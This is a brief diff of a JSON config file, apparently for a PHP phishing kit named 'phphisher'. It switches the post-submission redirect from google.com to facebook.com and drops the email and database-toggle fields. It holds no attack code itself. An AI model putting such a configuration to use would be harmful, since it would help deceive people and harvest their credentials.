@@ -1,10 +1,8 @@
 {
 	"page": 0,
-	"email": "",
-	"page-redirect": "http://google.com/",
+	"page-redirect": "http://facebook.com/",
 	"dbuser": "root",
 	"dbpass": "phphisher",
 	"dbname": "phphisher",
-	"dbip": "localhost",
-	"usedb": true
+	"dbip": "localhost"
 }
